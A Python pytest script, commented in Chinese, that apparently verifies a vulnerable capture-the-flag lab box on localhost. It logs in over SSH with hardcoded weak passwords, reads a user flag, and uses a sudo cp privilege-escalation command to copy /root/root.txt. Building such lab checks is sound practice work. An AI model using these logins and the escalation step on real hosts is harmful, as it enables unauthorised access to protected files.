# 使用說明：
# 1. 將此腳本保存為 test_vulnerabilities.py。
# 2. 安裝 Python，作法為：在您的操作系統上安裝合適版本的 Python。
# 3. 安裝 pytest，作法為：在命令行中執行 pip install pytest。
# 4. 安裝 paramiko，作法為：在命令行中執行 pip install paramiko。
# 5. 在終端機中執行 pytest -v test_vulnerabilities.py 進行測試，以獲得詳細信息。

import pytest
import paramiko

# 指定參數
target_ip = "127.0.0.1"  # 請替換成目標主機IP
target_port = 2222  # SSH端口

@pytest.fixture(scope="module")
def ssh_client():
    """初始化SSH客戶端，並設置失敗的主機鑰匙策略。"""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return client

# 測試個案1
def test_ssh_login_as_admin(ssh_client):
    """測試個案-管理設定：以boxadmin登入，檢查是否為sudo組成員。"""
    try:
        ssh_client.connect(target_ip, username='boxadmin', password='boxadmin', port=target_port)
        stdin, stdout, stderr = ssh_client.exec_command('groups')
        groups = stdout.read().decode()
        assert 'sudo' in groups, "boxadmin 應該是 sudo 群組的成員"
    finally:
        ssh_client.close()

# 測試個案2
def test_ssh_login_success_and_read_user_file(ssh_client):
    """測試個案-外部滲透：以正確密碼登入allen並讀取user.txt，預期成功。"""
    try:
        ssh_client.connect(target_ip, username='allen', password='password', port=target_port)
        sftp = ssh_client.open_sftp()
        user_file = sftp.file('/home/allen/user.txt', 'r')
        assert user_file.read(), "應該能夠讀取 /home/allen/user.txt"
    finally:
        ssh_client.close()

# 測試個案3
def test_cp_privilege_escalation(ssh_client):
    """測試個案-內部提權：利用cp-privilege漏洞讀取/root/root.txt。"""
    try:
        ssh_client.connect(target_ip, username='allen', password='password', port=target_port)
        # 需要實現特定的提權技巧，此行代碼假定已經具備相關漏洞的利用條件
        ssh_client.exec_command('sudo cp /root/root.txt /tmp/')
        sftp = ssh_client.open_sftp()
        root_file = sftp.file('/tmp/root.txt', 'r')
        assert root_file.read(), "應該能夠讀取 /root/root.txt"
    finally:
        ssh_client.close()
